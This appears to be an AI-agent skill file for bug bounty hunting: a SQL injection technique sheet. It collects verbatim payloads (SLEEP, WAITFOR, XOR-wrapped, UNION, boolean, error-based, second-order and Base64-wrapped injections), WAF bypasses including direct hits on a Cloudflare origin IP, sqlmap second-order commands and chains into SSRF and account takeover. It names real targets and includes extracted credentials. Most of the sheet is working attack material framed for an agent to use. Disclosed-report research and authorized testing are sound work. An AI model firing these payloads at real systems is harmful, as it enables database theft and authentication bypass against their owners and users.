---
name: hunter-l3-sql-injection
description: "Use when hunting SQL Injection on a target. Loads the L3 technique sheet: SQL injection remains the highest-signal, highest-certainty bug class in bug bounty: an unsanitized user value concatenated into a backend query produces confirmed, demonstrated database access (not speculation)."
domain: cybersecurity
subdomain: web
tags:
- web
- sql-injection
- hunting
- l3
version: '1.0'
---

# SQL Injection — Technique Sheet

## Overview
SQL injection remains the highest-signal, highest-certainty bug class in bug bounty: an unsanitized user value concatenated into a backend query produces confirmed, demonstrated database access (not speculation). It pays across every program type — classic web apps, WordPress/plugins, APIs (REST and JSON bodies), headers (Referer), mobile content providers, and even Base64-wrapped parameters. When you find it, you can almost always upgrade to proven impact: version/user extraction, full DB dumps, auth bypass, or chains into RCE and account takeover. The dominant confirmation technique across these records is blind extraction — time-based (SLEEP / WAITFOR / BENCHMARK) or boolean oracles — with UNION-based and error-based used where output is reflected.

## Distinct sub-patterns

### 1. Classic time-based blind SQLi on GET/POST parameters (MySQL SLEEP)
- **Endpoint shape / parameter:** `GET /changeReplaceOpt.php?acctid=...`, `GET /js/commentAction/` (acctid inside JSON), `GET /reader_api/stories.php?search=...`, `POST /signin/` (phone_number), `GET /{redacted}/library.php?c=...`
- **Payload that fired (verbatim):**
  - `419523%20AND%20SLEEP(15)` (id=1042746)
  - `251219%20AND%20SLEEP(15)%23` (id=1044698)
  - `0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg` (id=1039315)
  - `acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)` (id=1069561 — the classic subquery-wrapped SLEEP)
  - `'XOR(if(now()=sysdate(),sleep(1*1),0))OR'` (id=1024984)
  - URL-encoded XOR form: `phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar` (id=1069531)
- **Root cause:** Parameter value concatenated into a SQL query without parameterization (MySQL backend).
- **Impact proven:** Response delays scale with sleep value (15.4s/7.5s for SLEEP(15)/SLEEP(7); 2,077→9,989ms scaling; 13s delay vs 2s baseline); database() enumerated (`id_commxn2s`); full database access / auth bypass claimed and accepted.
- **Exemplars:** 1042746, 1044698, 1039315, 1024984, 1069531.

### 2. Time-based blind via stored/second-order injection (payload stored at one endpoint, executed at another)
- **Endpoint shape / parameter:** `POST /evil-quiz` param `name` — payload stored at registration, then evaluated when the score page (`/evil-quiz/score`) runs an unparameterized COUNT query over the stored value.
- **Payloads that fired (verbatim):**
  - `' or (select sleep(15))-- -` (id=1068934)
  - `" or sleep(5)` (id=1069392)
  - `name=admin'` (id=1067835 — minimal payload to confirm second-order execution)
  - `name=admin' AND 2619=2619 AND 'gAdb'='gAdb` (id=1067443)
  - `' or ''='` (id=1068880)
- **Root cause:** Write path stores user input; a *different* query later interpolates it. Neither endpoint shows an error or reflection directly — the oracle appears only at the second request.
- **Impact proven:** Full dump of quiz DB via `sqlmap --second-url=https://.../evil-quiz/score --cookie="session=..."`; admin credentials extracted and admin panel accessed.
- **Exemplars:** 1068934, 1067037, 1069392.

### 3. Boolean-based blind with character-by-character extraction (LIKE/ASCII/ord/substring oracles)
- **Endpoint shape / parameter:** POST body fields (`name`), API params (`username`/`password` with LIKE wildcards), path segments.
- **Payloads that fired (verbatim):**
  - `grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -` (id=1066203)
  - `asd' or (select strcmp((SELECT substr(column_name,1,1) FROM information_schema.columns WHERE table_name = 'admin' limit 1 offset 1), '{}')=0)#` (id=1065583 — strcmp against a literal as the boolean oracle)
  - `lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#` (id=1066851)
  - `Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d` (id=1068434 — ord() = candidate as the oracle)
  - `sdfasdfgdsfgx' or substring(binary({query}), {position}, 1) = char({candidate}); --` (id=1069039 — binary() to force byte-exact comparison)
  - `hax" OR (select 1 from admin)#` (id=1069189 — subselect existence check to verify table/column names)
  - `username=%` (id=1065885 — bare `%` LIKE wildcard as a distinct-response probe: "Invalid content type detected")
- **Root cause:** Injected expression changes which rows a query matches; a reflected side channel (player count, error message, page difference, 200 vs 404) is the oracle.
- **Impact proven:** Character-by-character extraction of `admin:S3creT_p4ssw0rd-$`, `grinchadmin:s4nt4sucks`; schema enumeration via information_schema; subsequent authenticated access.
- **Exemplars:** 1066203, 1066851, 1068434, 1069039, 1065583.

### 4. UNION-based injection (direct and nested/double-query)
- **Endpoint shape / parameter:** Path parameters: `GET /commenthistory/{YourSiteId}`, `GET /item/default{path}`, `GET /r3c0n_server_4fdk59/album?hash={hash}`.
- **Payloads that fired (verbatim):**
  - `https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23` → rendered `10.1.32-MariaDB` on-page (id=1046084)
  - `GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-` (id=1125752 — MySQL version-gated comment syntax `/*!50000union*/` for filter bypass; MSSQL HOST_NAME() dumped; version + hostname extracted)
  - Nested double-UNION where the first query's output feeds a *second* query's picture path: `-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - //` (id=1068880); `0' UNION ALL SELECT '0\' union all select 1,\'hash\',\'../api\' -- ',1,'albumtitle'-- -` (id=1069039); `-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -` (id=1066203)
- **Root cause:** Injected columns control displayed data; in the nested case, UNION output controls a file/image path that the server signs with a valid auth token — converting SQLi into an SSRF/auth-bypass into IP-restricted internal APIs.
- **Impact proven:** DB version rendered on page; MSSQL hostname and version dumped; internal `/api/user` reached through the SSRF chain, credentials extracted.
- **Exemplars:** 1046084, 1125752, 1068880, 1066203.

### 5. Time-based blind in MSSQL (WAITFOR DELAY)
- **Endpoint shape / parameter:** `POST /api/v1/token` param `refresh_token`; path injection `/api/river/observed-data/{id}`; `GET /track/unsubscribe.do?p=<base64>`.
- **Payloads that fired (verbatim):**
  - `'; WAITFOR DELAY '0:0:13'--` (id=1034625 — 13s vs 2s baseline)
  - `WAITFOR DELAY '0:0:10'` confirmed on id=1125752.
- **Root cause:** Value concatenated into an MSSQL query without parameterization; WAITFOR is the MSSQL equivalent of SLEEP.
- **Impact proven:** Confirmed delays; claimed exfiltration from FTP server, auth bypass, and RCE (id=1034625).
- **Exemplars:** 1034625, 1125752.

### 6. Time/boolean blind on login parameters (XOR-wrapped payloads)
- **Endpoint shape / parameter:** `POST /wp-login.php` param `log` (id=1224660), `POST /ng/api/auth/login` param `username` (id=1436751), `POST /` param `log` (id=1109311).
- **Payloads that fired (verbatim):** `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z` (id=1224660, ~12000ms response); `0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z` (id=1436751, 35s delay with matching scaled delays for sleep(15)/sleep(6)/sleep(3)).
- **Root cause:** Login username concatenated into a backend query (often a WordPress/auth plugin or custom pre-auth lookup) without parameterization; the XOR wrapper keeps the payload syntactically balanced inside a quoted string and evades naive filters.
- **Impact proven:** Pre-auth time-based blind SQLi; claimed database retrieval and authentication bypass.
- **Exemplars:** 1224660, 1436751.

### 7. SQLi in JSON-body parameters
- **Endpoint shape / parameter:** `POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings` JSON field `docId`.
- **Payload that fired (verbatim):** `{"docId":"1 and (select substring(@@version,1,1))='M'","docTitle":"..."}` (id=117073)
- **Root cause:** JSON field value concatenated into SQL — the JSON wrapper does not parameterize.
- **Impact proven:** Blind extraction of @@version character by character using true/false/syntax-error as a three-state oracle; arbitrary DB data extraction.
- **Exemplar:** 117073.

### 8. SQLi in HTTP headers (Referer)
- **Endpoint shape / parameter:** `GET /{path}/Chart01.php?alert=` — the **Referer header** value.
- **Payload that fired (verbatim):** `'+(select*from(select(if(1=1,sleep(20),false)))a)+` (id=1018621)
- **Root cause:** Referer concatenated into a backend query (common in analytics/logging code).
- **Impact proven:** 20-second delay on true condition; first character of database name (`m`) extracted.
- **Exemplar:** 1018621.

### 9. SQLi in SQL clauses other than WHERE — OFFSET / IN / ORDER BY
- **Endpoint shape / parameter:** POST param `rnum` feeding an **OFFSET clause** (id=1015406); POST param `groups` feeding an **IN clause** (id=1081145).
- **Payload:** id=1015406 payload not stated (POST body redacted); id=1081145 payload not stated (exploit script referenced: `php sqli.php http://localhost/impresscms/`).
- **Root cause:** Non-WHERE concatenation points — pagination offsets and IN-lists — are frequently forgotten in parameterization.
- **Impact proven:** Different rows returned per injection, i.e., full table walking (dump usernames/password hashes, auth bypass) for the OFFSET case; unauthenticated boolean SQLi extracting admin's email and any users-table field including password hashes (id=1081145).
- **Exemplars:** 1015406, 1081145.

### 10. Boolean blind via URL path segment (extract via status-code oracle)
- **Endpoint shape / parameter:** `GET /item/default'...` — path segment after the last static component.
- **Payload that fired (verbatim):** `http://51.83.253.82/item/default'and%20UPPER('asd')='asd'--` (id=1107536)
- **Root cause:** Path segment concatenated into SQL; note the report hit the **origin IP directly to bypass the Cloudflare WAF**.
- **Impact proven:** Database version `20.9.2.2` extracted via `substr(version(),n,1)` enumeration using **200/404 HTTP status as the oracle**.
- **Exemplar:** 1107536.

### 11. SQLi hidden inside Base64/serialized parameters (decode the wrapper, inject the inner value)
- **Endpoint shape / parameter:** `GET /track/unsubscribe.do?p=` (Base64 JSON, id=150156); `GET /admin.php?/cp/utilities/query/run-query&thequery=` (Base64 SQL, id=149279).
- **Payloads that fired (verbatim):**
  - Base64 of `{"user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail"}` → time-based blind; dumped MySQL user `sendcloud_w@10.9.79.210` and DB name `sendcloud` (id=150156).
  - `thequery=c2VsZWN0ICogZnJvbSBleHBfbWVtYmVycw==` (Base64 of `select * from exp_members`) — the "Query Form" admin feature executes arbitrary attacker-supplied SQL (id=149279).
- **Root cause:** Endpoints deserialize/decode a parameter and concatenate an inner field into SQL; also, "run query" features that accept full queries are SQLi-by-design if reachable.
- **Impact proven:** Full arbitrary SQL execution; database and MySQL user disclosure.
- **Exemplars:** 150156, 149279.

### 12. Error-based injection (leverage DB error messages as an output channel)
- **Endpoint shape / parameter:** POST param (redacted) on a DoD asset.
- **Payload that fired (verbatim):** `url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A` (id=1489744 — casting `version` to a date forces a type error whose message leaks the value).
- **Root cause:** No prepared statements; error messages enabled/returned.
- **Impact proven:** Database version, current database name, and current database user extracted; full DB exfiltration and RCE claimed.
- **Exemplar:** 1489744.

### 13. Framework-level / ORM injection (parameter parsing breaks the ORM)
- **Endpoint shape / parameter:** Rails Active Record dynamic finders (`find_by_token`, `User.where`) with `params[:token]` parsed from JSON.
- **Payload:** Crafted values like `[nil]` or an empty hash (payload not fully stated in record).
- **Root cause:** JSON parameter parsing lets `[nil]` / empty-hash values bypass `nil?` checks and alter generated WHERE clauses to `IS NULL` or empty.
- **Impact proven:** Password-reset token check bypassed — password reset without a valid token (CVE-2016-6317).
- **Exemplar:** 139321.

### 14. Mobile exported content provider (SQLite injection without a web endpoint)
- **Endpoint shape / parameter:** Android `content://org.owncloud/file` — exported `FileContentProvider` accepting `where`, `selection`, `selectionArgs`, `values`, `sortOrder`.
- **Payload that fired (verbatim):** `etag=?,path=(SELECT GROUP_CONCAT(columnName,'\n') FROM tableName) WHERE _id=<id>-- -` (id=1650264)
- **Root cause:** Exported provider passes where/selection/values/sortOrder straight into SQLite queries — no restriction on any clause.
- **Impact proven:** Enumerated tables via SQLITE_MASTER, exfiltrated `room_master_table`/`folder_backup` from owncloud_database via blind SQLite injection.
- **Exemplar:** 1650264.

### 15. Bulk/blind arithmetic-confirm and stacked-second-order variants (minor but present)
- `POST /{redacted}0` param `sDirID`: `-1 OR 3*2*1=6 AND 000159=000159` evaluated TRUE vs original value 51 — arithmetic tautology confirmation (id=1250293).
- `POST /██████` integer param: `2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)` — big sleep to punch through noise; sqlmap dumped tables (id=1262757).
- PUT-body boolean: `" AND 1 = "1 --+-` on `PUT /consumer/onboarding/saleslead/{uuid}` param `salesLeadId` — AND 1=1/1=0/`OR 1=1` response diff; note payload quotes `1` as a string `"1"` to match a string-typed column (id=1044716).

## Bypass / chain notes
- **Version-gated comment syntax:** `/*!50000union*/` (id=1125752) — MySQL executes the union only on version ≥ 5.00.00; hides the keyword from naive filters.
- **Origin-IP bypass of WAF/CDN:** resolve the Cloudflare-fronted host's origin (51.83.253.82) and inject directly against it (id=1107536).
- **XOR wrapper:** `'XOR(if(now()=sysdate(),sleep(N),0))XOR'Z` keeps string quoting balanced and slipped past an existing filter that the reporter then defeated (id=1224660: "the prior filter was bypassed").
- **Second-order exploitation:** `sqlmap --second-url=<trigger URL> --cookie="session=..."` — inject at the write endpoint, trigger evaluation at the read endpoint. Used by at least four reporters against the same target (ids 1066504, 1067037, 1068880, 1069392).
- **SQLi → SSRF → auth bypass chain:** nested UNION injects an attacker-chosen image path (`../api/...`) which the server signs with a valid auth token; the signed request is then issued server-side, bypassing an IP allowlist on internal APIs (ids 1068880, 1069039, 1066203, 1069392).
- **Three-state oracle:** treat syntax errors as a distinct response from true/false — `substring(@@version,1,1)='M'` true/false/error extraction (id=117073).
- **Status-code oracle:** 200 vs 404 as true/false (id=1107536); side-channel message ("Invalid content type detected") as oracle (id=1065885); "There is N other players" count as oracle (id=1069141).
- **Force byte-exact comparisons:** `substring(binary(...), pos, 1) = char(...)` to defeat case-insensitive collation during blind extraction (id=1069039).
- **Oracle via COUNT:** a UNION `select ... from admin where ...` inside a COUNT query changes the reflected count when the condition is true (id=1068434).
- **SQLi → account takeover chain:** unauthenticated boolean SQLi on `findusers.php` groups param combined with a second token-issuance bug to extract admin email and hijack the account (id=1081145).

## Gotchas / what NOT to do
- **Not every SLEEP is a win by itself** — pair the timing difference with a baseline: records always report baseline vs delayed (e.g. 2s baseline vs 13s delay, id=1034625). A single unexplained slow response will be triaged as noise.
- **Scale the sleep to the environment**: use big sleeps (SLEEP(32), id=1262757; sleep(35), id=1436751) only where noise is high; keep them reversible (sleep(15)/sleep(7) scaled comparison) to prove the delay tracks your value, not load.
- **Watch parameter types**: `AND 1=1` fails silently on string-typed columns — match the quoted form (`AND 1 = "1"`, id=1044716) and pad arithmetic tautologies to the expected type (`000159=000159`, id=1250293).
- **Decode wrappers before testing**: Base64/JSON-encoded parameters (ids 150156, 149279) and JSON body fields (id=117073) hide injection points from scanners and from hunters who only fuzz top-level params.
- **Test non-WHERE clauses**: pagination (`OFFSET`), `IN` lists, and ORDER BY are commonly unsanitized (ids 1015406, 1081145).
- **Test headers, not just params**: Referer was the vulnerable input (id=1018621).
- **Don't assume ORM = safe**: Rails parameter-parsing quirks broke `nil?` guards (id=139321).
- **Keep payloads syntactically closed**: `' ... AND 'wRIg' LIKE 'wRIg` and `-- -` terminators appear throughout — unbalanced quotes just produce errors that mask a real bug.
- **On second-order bugs, sqlmap's default mode won't work** — you must supply `--second-url` (and session cookie) or you'll conclude there's no injection.
- **Some records lacked demonstrated impact** (ids 1002641, 109393, 125932) — where you cannot demonstrate extraction, expect weaker triage; the accepted reports in this set almost always prove at least version/user/database extraction.

## Real-world impact examples
- **WordPress/site DB compromise (Automattic/IntenseDebate):** `union select 1,2,@@VERSION` rendered `10.1.32-MariaDB` on-page; SLEEP-proven injection gave "full database access holding private user information" and `database()` = `id_commxn2s` (ids 1046084, 1042746, 1044698).
- **Pre-auth login SQLi (Acronis):** `0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z` on `/ng/api/auth/login` produced a 35s delay with proportional scaling — accepted as enabling auth bypass and database retrieval (id=1436751).
- **API token endpoint (Informatica):** `'; WAITFOR DELAY '0:0:13'--` in `refresh_token` — 13s vs 2s baseline; claimed FTP-server exfiltration, auth bypass, RCE (id=1034625).
- **Government asset (DoD):** OFFSET-clause injection returning different rows per injection — dumpable password hashes and auth bypass (id=1015406); error-based `cast(version as date) LIKE 'A'` leaked DB version, name, and current user (id=1489744).
- **Mobile data exfiltration (ownCloud Android):** exported content provider SQLite injection enumerated SQLITE_MASTER and exfiltrated `room_master_table` / `folder_backup` (id=1650264).
- **SQLi → SSRF → internal API compromise (h1-CTF):** nested UNION forged a signed path to `../api/user`, bypassed the IP allowlist, and extracted `grinchadmin:s4nt4sucks` (ids 1068880, 1069039).
- **SQLi → account takeover (ImpressCMS):** unauthenticated boolean SQLi on `include/findusers.php` groups param disclosed the admin email and any users-table field including password hashes (id=1081145).
- **MSSQL fingerprint + hostname (TVA):** `/*!50000union*/ SELECT HOST_NAME()` dumped the DB hostname and full SQL Server 2017 version/build on Windows Server 2012 R2 (id=1125752).
- **Version extraction via status oracle behind Cloudflare (CS Money):** origin-IP hit with `'and UPPER('asd')='asd'--` extracted version `20.9.2.2` (id=1107536).